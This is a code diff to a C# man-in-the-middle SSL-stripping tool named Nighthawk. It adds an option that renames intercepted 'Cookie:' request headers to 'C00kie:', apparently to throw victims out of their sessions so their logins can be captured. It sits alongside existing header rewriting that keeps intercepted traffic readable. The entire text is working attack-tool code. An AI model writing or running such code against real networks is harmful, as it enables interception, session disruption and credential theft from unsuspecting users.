@@ -29,6 +29,7 @@ namespace Nighthawk
         public bool Started;
 
         private DeviceInfo deviceInfo;
+        private bool stripCookies;
 
         // regex 
         private Regex regexEncoding = new Regex(@"Accept-Encoding: (.*?)\r\n", RegexOptions.Compiled | RegexOptions.Singleline);
@@ -54,9 +55,10 @@ namespace Nighthawk
         }
 
         // start SSL strip
-        public void Start()
+        public void Start(bool cookies)
         {
             Started = true;
+            stripCookies = cookies;
         }
 
         // stop SSL strip
@@ -100,7 +102,7 @@ namespace Nighthawk
 
                     if (data.Contains("Accept-Encoding:"))
                     {
-                        // replace Accept-encoding (prevent unreadable data)
+                        // replace Accept-Encoding (prevent unreadable data)
                         var diff = data.Length - regexEncoding.Replace(data, "Accept-Encoding: \r\n").Length;
 
                         var extra = string.Empty;
@@ -121,6 +123,14 @@ namespace Nighthawk
                         
                         data = regexModified.Replace(data, "If-Modified-Since: "+ time.ToString("R") +"\r\n");
                         changed.Add("If-Modified-Since");
+                    }
+
+                    // strip cookies if enabled
+                    if (stripCookies && data.Contains("Cookie:"))
+                    {
+                        data = data.Replace("Cookie:", "C00kie:");
+
+                        changed.Add("Cookies");
                     }
                 }
                 // server response
